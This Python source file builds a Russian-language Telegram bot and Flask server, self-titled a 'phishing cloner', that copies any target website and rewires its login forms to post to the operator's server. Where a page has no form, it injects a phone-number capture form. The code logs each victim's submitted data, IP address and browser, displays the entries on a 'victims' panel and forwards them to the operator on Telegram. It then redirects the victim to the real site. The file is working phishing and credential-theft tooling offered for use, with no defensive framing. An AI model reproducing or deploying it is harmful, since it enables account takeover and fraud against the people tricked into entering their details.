import telebot
import requests
from bs4 import BeautifulSoup
import os
import shutil
from urllib.parse import urljoin, urlparse
import zipfile
import threading
import time
import json
import re
import hashlib
import uuid
from flask import Flask, request, render_template_string, jsonify

# ========== КОНФИГ ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
ALLOWED_USERS = [ADMIN_ID]
ACTIVE_TASKS = {}
PHISH_SITES = {}  # {phish_id: {url, logs: [], created_at}}

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# ========== ПАНЕЛЬ УПРАВЛЕНИЯ ==========
PANEL_HTML = '''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Панель управления</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 20px; }
        h1 { border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px; }
        .log-entry { 
            background: #111; 
            border: 1px solid #333; 
            padding: 10px; 
            margin: 10px 0; 
            border-radius: 5px;
        }
        .log-entry:hover { border-color: #00ff00; }
        .key { color: #ff0; }
        .val { color: #0ff; }
        .time { color: #666; font-size: 12px; }
        .count { color: #f00; font-size: 20px; }
        .empty { color: #666; text-align: center; margin: 50px; }
    </style>
    <script>
        // Автообновление каждые 5 секунд
        setInterval(() => location.reload(), 5000);
    </script>
</head>
<body>
    <h1>🎣 Панель управления — {{ phish_url }}</h1>
    <p>Фишинг-сайт: <a href="{{ phish_url }}" target="_blank">{{ phish_url }}</a></p>
    <p class="count">Жертв: {{ logs|length }}</p>
    <hr>
    {% if logs %}
        {% for log in logs|reverse %}
        <div class="log-entry">
            {% for key, value in log.items() %}
            <span class="key">{{ key }}:</span> 
            <span class="val">{{ value }}</span><br>
            {% endfor %}
            <span class="time">{{ log.get('time', '') }}</span>
        </div>
        {% endfor %}
    {% else %}
        <div class="empty">Пока нет данных. Ждём жертв...</div>
    {% endif %}
</body>
</html>
'''

@app.route('/panel/<phish_id>')
def view_panel(phish_id):
    """Веб-панель логов"""
    phish = PHISH_SITES.get(phish_id)
    if not phish:
        return "Фишинг-сайт не найден", 404
    
    return render_template_string(
        PANEL_HTML, 
        phish_url=phish['url'],
        logs=phish.get('logs', [])
    )

@app.route('/submit/<phish_id>', methods=['POST'])
def submit_phish(phish_id):
    """Принимает данные с фишинг-страницы"""
    phish = PHISH_SITES.get(phish_id)
    if not phish:
        return jsonify({'error': 'not found'}), 404
    
    # Собираем все данные
    data = {}
    for key, value in request.form.items():
        data[key] = value
    
    # Добавляем метаданные
    data['ip'] = request.remote_addr
    data['user_agent'] = request.headers.get('User-Agent', '?')
    data['referer'] = request.headers.get('Referer', 'direct')
    data['time'] = time.strftime('%Y-%m-%d %H:%M:%S')
    
    # Сохраняем
    phish.setdefault('logs', []).append(data)
    
    # Сохраняем в файл
    os.makedirs(f'/tmp/phish_logs/{phish_id}', exist_ok=True)
    with open(f'/tmp/phish_logs/{phish_id}/logs.json', 'a') as f:
        f.write(json.dumps(data, ensure_ascii=False) + '\n')
    
    # Отправляем в Telegram
    log_text = "🔥 НОВАЯ ЖЕРТВА!\n\n"
    for k, v in data.items():
        log_text += f"<b>{k}</b>: <code>{v}</code>\n"
    
    bot.send_message(ADMIN_ID, log_text, parse_mode='HTML')
    
    # Редирект на оригинальный сайт
    original_url = phish.get('original_url', 'https://google.com')
    return f'<script>window.location.href="{original_url}";</script>'

# ========== ФИШИНГ-КЛОНЕР ==========
class PhishCloner:
    def __init__(self, target_url, task_id, chat_id):
        self.target_url = target_url.rstrip('/')
        self.task_id = task_id
        self.chat_id = chat_id
        self.phish_id = hashlib.md5(task_id.encode()).hexdigest()[:12]
        self.output_dir = f"/tmp/phish/{self.phish_id}"
        self.domain = urlparse(target_url).netloc
        
        os.makedirs(self.output_dir, exist_ok=True)
        for folder in ['css', 'js', 'images', 'fonts']:
            os.makedirs(f"{self.output_dir}/{folder}", exist_ok=True)
        
        self.session = requests.Session()
        self.assets_count = 0
    
    def download_asset(self, url, folder):
        """Скачивает ассет"""
        try:
            if not url or url.startswith(('data:', 'blob:', '#')):
                return None
            
            if not url.startswith('http'):
                url = urljoin(self.target_url, url)
            
            filename = os.path.basename(urlparse(url).path.split('?')[0])
            if not filename or len(filename) < 3:
                ext = '.css' if '.css' in url else '.js' if '.js' in url else '.png'
                filename = f"asset_{hash(url) % 10000}{ext}"
            
            filepath = f"{self.output_dir}/{folder}/{filename}"
            
            resp = self.session.get(url, headers={
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
                'Referer': self.target_url,
            }, timeout=15)
            
            if resp.status_code == 200 and len(resp.content) > 100:
                with open(filepath, 'wb') as f:
                    f.write(resp.content)
                self.assets_count += 1
                return f"/assets/{folder}/{filename}"
        except:
            pass
        return None
    
    def create_phish(self):
        """Клонирует сайт и превращает в фишинг"""
        
        bot.send_message(self.chat_id, f"🎣 Создаю фишинг-клон {self.domain}...")
        
        # Загружаем сайт
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)',
            'Accept': 'text/html,application/xhtml+xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'ru-RU,ru;q=0.9',
        }
        
        resp = self.session.get(self.target_url, headers=headers, allow_redirects=True, timeout=20)
        
        if resp.status_code != 200:
            bot.send_message(self.chat_id, f"❌ Ошибка: HTTP {resp.status_code}")
            return None
        
        soup = BeautifulSoup(resp.text, 'html.parser')
        
        # Скачиваем CSS
        bot.send_message(self.chat_id, "📥 Ресурсы...")
        for tag in soup.find_all('link', href=True):
            if '.css' in tag.get('href', ''):
                local = self.download_asset(tag['href'], 'css')
                if local: tag['href'] = local
        
        # Скачиваем JS
        for tag in soup.find_all('script', src=True):
            local = self.download_asset(tag['src'], 'js')
            if local: tag['src'] = local
        
        # Скачиваем картинки
        for tag in soup.find_all('img', src=True):
            local = self.download_asset(tag['src'], 'images')
            if local: tag['src'] = local
        
        # ===== ВАЖНО: ЗАМЕНА ФОРМ =====
        form_count = 0
        for form in soup.find_all('form'):
            original_action = form.get('action', '')
            form['action'] = f'/submit/{self.phish_id}'
            form['method'] = 'POST'
            
            # Добавляем скрытые поля для захвата доп. данных
            hidden_input = soup.new_tag('input', type='hidden', name='original_action')
            hidden_input['value'] = original_action
            form.append(hidden_input)
            
            form_count += 1
        
        # Если форм нет — добавляем свою форму захвата
        if form_count == 0:
            bot.send_message(self.chat_id, "⚠️ Форм не найдено. Добавляю свою...")
            
            # Ищем кнопки/ссылки входа
            login_buttons = soup.find_all(['a', 'button'], string=re.compile(r'вход|войти|логин|sign.?in', re.I))
            
            for btn in login_buttons:
                # Оборачиваем в форму
                form = soup.new_tag('form', action=f'/submit/{self.phish_id}', method='POST')
                form['style'] = 'display:inline;'
                
                # Добавляем поля
                phone_input = soup.new_tag('input', type='text', name='phone', placeholder='Номер телефона')
                phone_input['style'] = 'padding: 10px; margin: 5px; width: 100%; border: 1px solid #ccc; border-radius: 5px;'
                
                submit_btn = soup.new_tag('button', type='submit')
                submit_btn.string = btn.get_text() or 'Войти'
                submit_btn['style'] = 'padding: 10px 20px; background: #007aff; color: white; border: none; border-radius: 5px; cursor: pointer; width: 100%;'
                
                form.append(phone_input)
                form.append(soup.new_tag('br'))
                form.append(submit_btn)
                
                btn.replace_with(form)
                form_count += 1
        
        bot.send_message(self.chat_id, f"✅ Форм заменено: {form_count}")
        
        # Создаём папку assets
        os.makedirs(f"{self.output_dir}/assets/css", exist_ok=True)
        os.makedirs(f"{self.output_dir}/assets/js", exist_ok=True)
        os.makedirs(f"{self.output_dir}/assets/images", exist_ok=True)
        
        # Переносим файлы в правильные папки
        for folder in ['css', 'js', 'images']:
            src = f"{self.output_dir}/{folder}"
            dst = f"{self.output_dir}/assets/{folder}"
            if os.path.exists(src):
                for f in os.listdir(src):
                    shutil.move(f"{src}/{f}", f"{dst}/{f}")
        
        # Сохраняем HTML
        with open(f'{self.output_dir}/index.html', 'w', encoding='utf-8') as f:
            f.write('<!DOCTYPE html>\n')
            f.write('<html>\n<head>\n')
            f.write('<meta charset="UTF-8">\n')
            f.write('<meta name="viewport" content="width=device-width, initial-scale=1.0">\n')
            f.write(f'<title>{self.domain}</title>\n')
            
            # CSS первым
            for tag in soup.find_all('link', href=True):
                f.write(str(tag) + '\n')
            
            f.write('</head>\n<body>\n')
            body_content = soup.find('body')
            if body_content:
                f.write(str(body_content))
            else:
                f.write(str(soup))
            f.write('\n</body>\n</html>')
        
        # Сохраняем в PHISH_SITES
        PHISH_SITES[self.phish_id] = {
            'url': self.target_url,
            'original_url': self.target_url,
            'logs': [],
            'created_at': time.time(),
            'form_count': form_count
        }
        
        return {
            'phish_id': self.phish_id,
            'form_count': form_count,
            'assets': self.assets_count,
            'dir': self.output_dir
        }

# ========== КОМАНДЫ БОТА ==========

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id not in ALLOWED_USERS:
        bot.reply_to(message, "⛔ Доступ запрещён")
        return
    
    bot.reply_to(message, """
🎣 ФИШИНГ-КЛОНЕР v4.0

Команды:
/phish URL — клонировать сайт и сделать фишинг
/panel ID — ссылка на панель логов
/logs ID — последние жертвы
/list — все фишинг-сайты

Пример:
/phish https://web.max.ru
""")

@bot.message_handler(commands=['phish'])
def phish_site(message):
    if message.from_user.id not in ALLOWED_USERS:
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ /phish https://site.com")
        return
    
    url = args[1]
    if not url.startswith('http'):
        url = 'https://' + url
    
    task_id = str(int(time.time()))[-8:]
    ACTIVE_TASKS[task_id] = {
        'url': url,
        'status': 'phishing',
        'chat_id': message.chat.id,
        'type': 'phish'
    }
    
    msg = bot.reply_to(message, f"🎣 Создаю фишинг...\n🎯 {url}")
    
    def process():
        cloner = PhishCloner(url, task_id, message.chat.id)
        result = cloner.create_phish()
        
        if result:
            phish_id = result['phish_id']
            
            # Ссылка на фишинг-сайт
            server_url = os.environ.get('RAILWAY_PUBLIC_DOMAIN', request.host_url.rstrip('/'))
            phish_url = f"{server_url}/phish/{phish_id}"
            panel_url = f"{server_url}/panel/{phish_id}"
            
            # Архив для скачивания
            zip_path = f"/tmp/phish/{phish_id}.zip"
            shutil.make_archive(f"/tmp/phish/{phish_id}", 'zip', result['dir'])
            
            ACTIVE_TASKS[task_id]['status'] = 'done'
            ACTIVE_TASKS[task_id]['phish_id'] = phish_id
            ACTIVE_TASKS[task_id]['file'] = zip_path
            ACTIVE_TASKS[task_id]['panel_url'] = panel_url
            ACTIVE_TASKS[task_id]['phish_url'] = phish_url
            
            text = f"""
✅ ФИШИНГ ГОТОВ!

🔑 ID: <code>{phish_id}</code>
🎯 Оригинал: {url}
📊 Форм: {result['form_count']}
📎 Ресурсов: {result['assets']}

🎣 ФИШИНГ-ССЫЛКА:
<code>{phish_url}</code>

📊 ПАНЕЛЬ ЛОГОВ:
<code>{panel_url}</code>

Команды:
/panel {phish_id} — панель логов
/logs {phish_id} — логи в Telegram
/get {task_id} — скачать ZIP
"""
            bot.edit_message_text(text, message.chat.id, msg.message_id, parse_mode='HTML')
        else:
            bot.edit_message_text("❌ Ошибка создания", message.chat.id, msg.message_id)
    
    threading.Thread(target=process).start()

@bot.message_handler(commands=['panel'])
def show_panel(message):
    if message.from_user.id not in ALLOWED_USERS:
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ /panel PHISH_ID")
        return
    
    phish_id = args[1]
    server_url = os.environ.get('RAILWAY_PUBLIC_DOMAIN', request.host_url.rstrip('/'))
    panel_url = f"{server_url}/panel/{phish_id}"
    
    bot.reply_to(message, f"📊 Панель логов:\n{panel_url}")

@bot.message_handler(commands=['logs'])
def show_logs(message):
    if message.from_user.id not in ALLOWED_USERS:
        return
    
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ /logs PHISH_ID")
        return
    
    phish_id = args[1]
    phish = PHISH_SITES.get(phish_id)
    
    if not phish:
        # Пробуем загрузить из файла
        log_file = f'/tmp/phish_logs/{phish_id}/logs.json'
        if os.path.exists(log_file):
            with open(log_file) as f:
                logs = [json.loads(line) for line in f.readlines()[-10:]]
        else:
            bot.reply_to(message, "❌ Нет логов")
            return
    else:
        logs = phish.get('logs', [])
    
    if not logs:
        bot.reply_to(message, "📭 Пока нет жертв")
        return
    
    for log in logs[-5:]:  # Последние 5
        text = "🔥 ЖЕРТВА:\n"
        for k, v in log.items():
            if k not in ['user_agent', 'referer']:
                text += f"<b>{k}</b>: <code>{v}</code>\n"
        
        bot.send_message(message.chat.id, text, parse_mode='HTML')

@bot.message_handler(commands=['list'])
def list_phish(message):
    if message.from_user.id not in ALLOWED_USERS:
        return
    
    if not PHISH_SITES:
        bot.reply_to(message, "📭 Нет фишинг-сайтов")
        return
    
    text = "🎣 АКТИВНЫЕ ФИШИНГ-САЙТЫ:\n\n"
    server_url = os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'localhost')
    
    for pid, p in PHISH_SITES.items():
        victims = len(p.get('logs', []))
        text += f"🔑 <code>{pid}</code>\n"
        text += f"🎯 {p['url']}\n"
        text += f"👥 Жертв: {victims}\n"
        text += f"📊 /panel {pid}\n"
        text += f"🎣 {server_url}/phish/{pid}\n\n"
    
    bot.reply_to(message, text, parse_mode='HTML')

@bot.message_handler(commands=['get'])
def get_file(message):
    if message.from_user.id not in ALLOWED_USERS:
        return
    
    args = message.text.split()
    if len(args) < 2:
        return
    
    task_id = args[1]
    task = ACTIVE_TASKS.get(task_id)
    
    if not task or task['status'] != 'done':
        bot.reply_to(message, "❌ Не готово")
        return
    
    filepath = task.get('file')
    if not filepath or not os.path.exists(filepath):
        bot.reply_to(message, "❌ Файл не найден")
        return
    
    with open(filepath, 'rb') as f:
        bot.send_document(message.chat.id, f, 
                         visible_file_name=f"phish_{task.get('phish_id','clone')}.zip")

# ========== ОТДАЧА ФИШИНГ-СТРАНИЦ ==========
@app.route('/phish/<phish_id>')
def serve_phish(phish_id):
    """Отдаёт фишинг-страницу жертве"""
    index_path = f'/tmp/phish/{phish_id}/index.html'
    if os.path.exists(index_path):
        with open(index_path, 'r', encoding='utf-8') as f:
            return f.read()
    return "Страница не найдена", 404

@app.route('/phish/<phish_id>/assets/<folder>/<filename>')
def serve_asset(phish_id, folder, filename):
    """Отдаёт ассеты фишинг-сайта"""
    path = f'/tmp/phish/{phish_id}/assets/{folder}/{filename}'
    if os.path.exists(path):
        mimetypes = {
            'css': 'text/css',
            'js': 'application/javascript',
            'png': 'image/png',
            'jpg': 'image/jpeg',
            'svg': 'image/svg+xml',
            'woff': 'font/woff',
            'woff2': 'font/woff2',
        }
        mime = mimetypes.get(folder, 'application/octet-stream')
        return open(path, 'rb').read(), 200, {'Content-Type': mime}
    return "Not found", 404

@app.route('/')
def home():
    return "Bot is running!", 200

# ========== ЗАПУСК ==========
def run_bot():
    bot.infinity_polling()

if __name__ == '__main__':
    print("🎣 Фишинг-Клонер v4.0 запущен!")
    os.makedirs('/tmp/phish', exist_ok=True)
    os.makedirs('/tmp/phish_logs', exist_ok=True)
    threading.Thread(target=run_bot).start()
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
